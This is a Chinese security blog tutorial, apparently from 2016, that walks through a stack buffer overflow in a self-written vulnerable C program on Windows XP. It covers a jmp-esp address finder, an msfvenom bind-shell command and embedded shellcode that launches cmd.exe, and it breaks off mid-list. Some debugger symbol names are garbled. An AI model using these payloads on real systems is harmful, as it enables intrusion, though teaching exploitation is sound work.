<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>从栈溢出到简单的shellcode开发 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 从栈溢出到简单的shellcode开发评论Feed" href="http://www.mottoin.com/86821.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='浅析安全架构中遇到的问题' href='http://www.mottoin.com/86818.html' />
<link rel='next' title='关于「入侵对抗体系建设漫谈」的思考' href='http://www.mottoin.com/86839.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=86821' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="shellcode,栈溢出">
<meta name="description" content="0x00简介相信诸君对&quot;缓冲区溢出(bufferoverflow)&quot;这个术语不陌生,这是计算机软件中的常见漏洞,起源可以追溯到冯·诺依曼时代,因为制定的体系结构没有对数据和指令进行严格的划分,攻击者找到溢出漏洞后可以达到函数劫持、拒绝服务、命令执行等目的.这种技术相对于web安全,就像是华山剑派中的气宗和剑宗.气宗更注重内力的修习,起笔之前,假设诸君对汇编语言、计算机系统、c语言有一定的了解.0x">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-86821 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-86821" class="post-86821 post type-post status-publish format-standard has-post-thumbnail hentry category-tech category-terminal tag-shellcode tag-646">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">从栈溢出到简单的shellcode开发</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/seceditor/">Moto</a>
                                <span class="dot">•</span>
                                <span>2016年8月10日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/tech" rel="category tag">技术控</a>, <a href="http://www.mottoin.com/category/article/terminal" rel="category tag">终端安全</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1347</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <h2>0x00 简介</h2>
<p>相信诸君对&#8221;缓冲区溢出(buffer overflow)&#8221;这个术语不陌生,这是计算机软件中的常见漏洞,起源可以追溯到冯·诺依曼时代,因为制定的体系结构没有对数据和指令进行严格的划分,攻击者找到溢出漏洞后可以达到函数劫持、拒绝服务、命令执行等目的.这种技术相对于web安全,就像是华山剑派中的气宗和剑宗.气宗更注重内力的修习,起笔之前,假设诸君对汇编语言、计算机系统、c语言有一定的了解.</p>
<h2>0x01 基础知识</h2>
<p>缓冲区溢出可以分为堆溢出和栈溢出. 堆跟栈是两片不同架构的内存区域. 堆：程序运行时动态申请而分配的空间,大小不固定,可动态扩展.特点是需要主动申请:例如c语言中的malloc函数,申请的内存添加到堆上,堆被扩大. 主动释放:例如free函数,假如不主动释放,就会造成内存泄漏.</p>
<p>栈: 栈在程序运行时自动产生,负责保存进程的运行上下文,当函数调用时,逻辑上会在栈中开辟一块新区域, 我们称之为栈帧(stack frame),栈帧内保存调用的参数、返回值,包括上一级函数的返回地址.例如:</p>
<pre class="">void test(){
 ...
}
main(){
 test();
 ...
}</pre>
<p>例如main函数中调用test函数,假如有参数 逻辑上新建的栈帧中会保存参数,并且会保存main函数的地址,test函数执行完成后用来返回到main函数,回到原先的栈帧.然后继续执行下面的代码.</p>
<p>逻辑上新开辟的栈帧已经消失,但物理保存的数据并不会消失, 栈的溢出原理就是参数的值超出了缓冲区的大小,覆盖了返回地址,函数调用完成后,返回到了攻击者指定的地址去执行代码.</p>
<p>要达到命令执行的目的,攻击者通常会精心构造一段数据作为参数传给有漏洞的函数,这段数据中包含攻击负载,就是常说的shellcode.</p>
<p>此外还有三个重要的寄存器:</p>
<ol>
<li>代码的执行指针eip,永远指向下一条要执行的指令</li>
<li>栈帧的最顶端以两个指针界定,ebp为帧指针,永远指向栈底,</li>
<li>esp为栈指针,永远指向栈顶</li>
</ol>
<p><img class="alignnone size-full wp-image-86822 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/1-43.png" alt="1" width="486" height="443" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/1-43.png 486w, http://www.mottoin.com/wp-content/uploads/2016/08/1-43-300x273.png 300w" sizes="(max-width: 486px) 100vw, 486px" /></p>
<p>可以看到栈是向低地址方向增长的,在汇编中调用一个函数,通常是用call xxx,xxx可以是绝对地址也可以是间接地址,在call跳到目标地址之前,会先将当前函数的返回地址压入到当前栈帧中,然后创建新的栈帧</p>
<p>来看一下函数调用,相关的汇编代码,这里就以MessageBoxEx为例,函数原型:</p>
<pre class="">int MessageBoxEx (HWND hWnd，LPCTSTR lpText, LPCTSTR IpCaption, UINT UType, WORD wLanguageld);</pre>
<pre class="">77D5081C 6A 00 PUSH 0
77D5081E FF75 14 PUSH DWORD PTR SS:[EBP+14]
77D50821 FF75 10 PUSH DWORD PTR SS:[EBP+10]
77D50824 FF75 0C PUSH DWORD PTR SS:[EBP+C]
77D50827 FF75 08 PUSH DWORD PTR SS:[EBP+8]
77D5082A E8 2D000000 CALL user32.MessageBoxExA</pre>
<p>如果没有明确的调用约定,参数以从右往左的方式传入 跳到目标地址</p>
<pre class="">push ebp
mov ebp,esp
sub esp,xxx

;some code

add esp,xxx
pop ebp
ret</pre>
<p>ebp压入新的栈帧,将esp的值给ebp,之后再将esp指针下拉(抬高了栈顶), 逻辑上这就算开辟了一块新的栈帧,函数主要命令执行完毕后,降低栈顶,恢复帧指针.逻辑上回收了栈帧空间.ret返回到调用之前的代码区</p>
<h2>0x02简单的缓冲区溢出示例</h2>
<pre class="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char name[]="test";
void test(char * a)
{
 char output[8];
 strcpy(output,a);
 printf("%s\n",output);
}

int main()
{
 test(name);
 return 0;
}</pre>
<p>这里我用一个简单的小程序演示一下缓冲区溢出,现在先不谈aslr、dep、safeSeh等</p>
<p>编译环境:vc++6.0</p>
<p>os: windows xp sp3</p>
<p><img class="alignnone size-full wp-image-86823 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/2-36.png" alt="2" width="656" height="317" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/2-36.png 656w, http://www.mottoin.com/wp-content/uploads/2016/08/2-36-300x145.png 300w" sizes="(max-width: 656px) 100vw, 656px" /></p>
<p>漏洞出在strcpy函数函数上,没有对传入的变量进行长度检查导致溢出.output变量开辟了8个字节的缓冲区空间,我们只要传入超出8字节的数据,就会发生错误,可能会覆盖ebp 甚至eip</p>
<p><img class="alignnone size-full wp-image-86824 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/3-31.png" alt="3" width="770" height="351" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/3-31.png 770w, http://www.mottoin.com/wp-content/uploads/2016/08/3-31-300x137.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/3-31-768x350.png 768w" sizes="(max-width: 770px) 100vw, 770px" /></p>
<p>提示在61616161地址上发生错误.61就是字母a的ascii编码,也就是说aaaa覆盖了eip,而此处没有合法的指令地址,触发异常,假设我们给出一个合法的指令地址,就成功的控制了程序的执行流程.</p>
<p>在strcpy函数上下断</p>
<p><img class="alignnone size-full wp-image-86825 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/4-28.png" alt="4" width="1017" height="422" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/4-28.png 1017w, http://www.mottoin.com/wp-content/uploads/2016/08/4-28-300x124.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/4-28-768x319.png 768w" sizes="(max-width: 1017px) 100vw, 1017px" /></p>
<p>f7跟进后</p>
<pre class="">00401020 &gt;/&gt; 55 PUSH EBP
00401021 |. 8BEC MOV EBP,ESP
00401023 |. 83EC 48 SUB ESP,48
00401026 |. 53 PUSH EBX
00401027 |. 56 PUSH ESI
00401028 |. 57 PUSH EDI
00401029 |. 8D7D B8 LEA EDI,DWORD PTR SS:[EBP-48]
0040102C |. B9 12000000 MOV ECX,12
00401031 |. B8 CCCCCCCC MOV EAX,CCCCCCCC
00401036 |. F3:AB REP STOS DWORD PTR ES:[EDI]
00401038 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]
0040103B |. 50 PUSH EAX
0040103C |. 8D4D F8 LEA ECX,DWORD PTR SS:[EBP-8]
0040103F |. 51 PUSH ECX
00401040 |. E8 0B010000 CALL test.strcpysgzeHeaderListdstalled
00401045 |. 83C4 08 ADD ESP,8
00401048 |. 8D55 F8 LEA EDX,DWORD PTR SS:[EBP-8]
0040104B |. 52 PUSH EDX ; /Arg2
0040104C |. 68 1C004200 PUSH OFFSET test.??_C@_03HHKO@?$CFs?6?$A&gt;; |Arg1 = 0042001C ASCII "%s
"
00401051 |. E8 7A000000 CALL test.printfgvdbgresholdnterctsled ; \printfgvdbgresholdnterctsled
00401056 |. 83C4 08 ADD ESP,8
00401059 |. 5F POP EDI
0040105A |. 5E POP ESI
0040105B |. 5B POP EBX
0040105C |. 83C4 48 ADD ESP,48
0040105F |. 3BEC CMP EBP,ESP
00401061 |. E8 DA010000 CALL test.__chkespleBuffers@4ingsW@4loca&gt;
00401066 |. 8BE5 MOV ESP,EBP
00401068 |. 5D POP EBP
00401069 \. C3 RETN</pre>
<p>在pop ebp执行后,ret执行前,查看寄存器状态</p>
<p><img class="alignnone size-full wp-image-86826 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/5-20.png" alt="5" width="620" height="578" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/5-20.png 620w, http://www.mottoin.com/wp-content/uploads/2016/08/5-20-300x280.png 300w" sizes="(max-width: 620px) 100vw, 620px" /></p>
<p>ret,成功覆盖eip</p>
<p><img class="alignnone size-full wp-image-86827 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/6-18.png" alt="6" width="814" height="375" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/6-18.png 814w, http://www.mottoin.com/wp-content/uploads/2016/08/6-18-300x138.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/6-18-768x354.png 768w" sizes="(max-width: 814px) 100vw, 814px" /></p>
<p><img class="alignnone size-full wp-image-86828 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/f5a6f5f98592c35b.png" alt="f5a6f5f98592c35b" width="695" height="388" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/f5a6f5f98592c35b.png 695w, http://www.mottoin.com/wp-content/uploads/2016/08/f5a6f5f98592c35b-300x167.png 300w" sizes="(max-width: 695px) 100vw, 695px" /></p>
<h2>0x03控制eip,定位到shellcode</h2>
<p>在上古时代,基于栈的缓冲区溢出是用调试器来确定一个shellcode的绝对地址,但有漏洞的函数通常在dll中,dll被动态加载,栈也会动态变化,不同的系统api函数的地址也不同,我们来看一个例子:</p>
<pre class="">int main(){
 int local;
 printf("local at %p\n",&amp;local);
 return 0;
}</pre>
<p>在32位的linux栈随机化的情况下,运行10000次这段代码,地址变化为0xff7fa7e0到0xffffd7e0,范围大约是2^23. 地址不固定原因导致溢出漏洞无法通用利用.由此延伸出一些布置shellcode的技巧,例如用nop淹没大片区域,之后再写入shellcode,运气好只要能进入这一片nop内,shellcode就得以执行. 直到1998年,黑客组织&#8221;Cult of the Dead Cow&#8221;的dildog首次提出用jmp esp完成shellcode定位.</p>
<p>在上面的图片中可以看到,ret之后,esp会指向aaaa后面的数据(shellcode). 找到一处命令为jmp esp的地址就可以精准定位shellcode.</p>
<p>程序被读入内存空间,一些系统dll会被加载,例如kernel32.dll、ntdll.dll、user32.dll.在核心dll地址不浮动的情况下,搜索出&#8221;jmp esp&#8221;的地址做为跳板,jmp esp对应机器码是0xFFE4,在相应dll内内存搜索即可. 当时做实验的时候 没装vc,用python的ctypes模块写了一个.提示冲突的话以system权限运行.</p>
<pre class="">#!/usr/bin/python
from ctypes import *

user32WinDllAddr=windll.kernel32.GetModuleHandleA('user32')
#string_at(user32WinDllAddr,1)

while 1:
 try:
 if string_at(user32WinDllAddr,2)=='\xff\xe4':
 print 'jmp esp va addr:\t'+str(hex(user32WinDllAddr))
 user32WinDllAddr+=1

except:
 break</pre>
<p><img class="alignnone size-full wp-image-86829 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/8-12.png" alt="8" width="976" height="412" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/8-12.png 976w, http://www.mottoin.com/wp-content/uploads/2016/08/8-12-300x127.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/8-12-768x324.png 768w" sizes="(max-width: 976px) 100vw, 976px" /></p>
<p>也可用msfpescan</p>
<pre class="">root@kali:/usr/share/framework2# ./msfpescan -f /root/kernel32.dll -j esp 
0x7c86467b jmp esp</pre>
<ul>
<li>大端机小端机的区别:</li>
</ul>
<blockquote><p>在几乎所有的机器上，多字节对象被存储为连续的字节序列，对象的地址为所使用字节序列中最低字节地e址。 小端：某些机器选择在存储器中按照从最低有效字节到最高有效字节的顺序存储对象，这种最低有效字节在最前面的表示方式被称为小端法(little endian) 。这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放； 大端：某些机器则按照从最高有效字节到最低有效字节的顺序储存，这种最高有效字节在最前面的方式被称为大端法(big endian) 。这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低，和我们的逻辑方法一致。</p></blockquote>
<p><img class="alignnone size-full wp-image-86831 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/9-10.png" alt="9" width="594" height="540" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/9-10.png 594w, http://www.mottoin.com/wp-content/uploads/2016/08/9-10-300x273.png 300w" sizes="(max-width: 594px) 100vw, 594px" /></p>
<p>eip已经跳到0x7c86467b,此时esp指向shellcode. f8跟进</p>
<p><img class="alignnone size-full wp-image-86832 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/10-5.png" alt="10" width="1336" height="560" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/10-5.png 1336w, http://www.mottoin.com/wp-content/uploads/2016/08/10-5-300x126.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/10-5-768x322.png 768w, http://www.mottoin.com/wp-content/uploads/2016/08/10-5-1024x429.png 1024w" sizes="(max-width: 1336px) 100vw, 1336px" /></p>
<p>test code:</p>
<pre class="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char name[]="\x61\x61\x61\x61"
 "\x61\x61\x61\x61"
 "\x7b\x46\x86\x7c" //pop ebp
 "\x7b\x46\x86\x7c" //ret eip
 "\x61\x61\x61\x61"; //shell code
void test(char * a)
{
 char output[8];
 strcpy(output,a);
 printf("%s\n",output);
}

int main()
{
 test(name);
 return 0;
}</pre>
<h2>0x04 生成shellcode.</h2>
<p>msfvenom已经整合了msfencode和msfpayload的功能</p>
<pre class="">root@kali:~# msfvenom --help
Error: MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;

Options:
 -p, --payload &lt;payload&gt; Payload to use. Specify a '-' or stdin to use custom payloads
 --payload-options List the payload's standard options
 -l, --list [type] List a module type. Options are: payloads, encoders, nops, all
 -n, --nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload
 -f, --format &lt;format&gt; Output format (use --help-formats for a list)
 --help-formats List available formats
 -e, --encoder &lt;encoder&gt; The encoder to use
 -a, --arch &lt;arch&gt; The architecture to use
 --platform &lt;platform&gt; The platform of the payload
 --help-platforms List available platforms
 -s, --space &lt;length&gt; The maximum size of the resulting payload
 --encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value)
 -b, --bad-chars &lt;list&gt; The list of characters to avoid example: '\x00\xff'
 -i, --iterations &lt;count&gt; The number of times to encode the payload
 -c, --add-code &lt;path&gt; Specify an additional win32 shellcode file to include
 -x, --template &lt;path&gt; Specify a custom executable file to use as a template
 -k, --keep Preserve the template behavior and inject the payload as a new thread
 -o, --out &lt;path&gt; Save the payload
 -v, --var-name &lt;name&gt; Specify a custom variable name to use for certain output formats
 --smallest Generate the smallest possible payload
 -h, --help Show this message</pre>
<p>example:</p>
<blockquote><p>msfvenom -p windows/shell/bind_tcp -b &#8216;\x00&#8217; -f c</p></blockquote>
<p>这里我测试的时候,shellcode必须小于206字节.msfvenom的payload普遍在300字节以上. 或者上网搜那种不考虑环境问题的简短shellcode</p>
<pre class="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char name[]="\x61\x61\x61\x61"
 "\x61\x61\x61\x61"
 "\x7b\x46\x86\x7c"
 "\x7b\x46\x86\x7c"
 "\x31\xc0\xeb\x13\x5b\x88\x43\x0e\x53\xbb\xad\x23\x86\x7c\xff\xd3\xbb"
 "\xfa\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78"
 "\x65\x20\x2f\x63\x20\x63\x6d\x64";
void test(char * a)
{
 char output[8];
 strcpy(output,a);
 printf("%s\n",output);
}

int main()
{
 test(name);
 return 0;
}</pre>
<p>或者动手编写,这之前再看一个基础知识点:</p>
<ol>
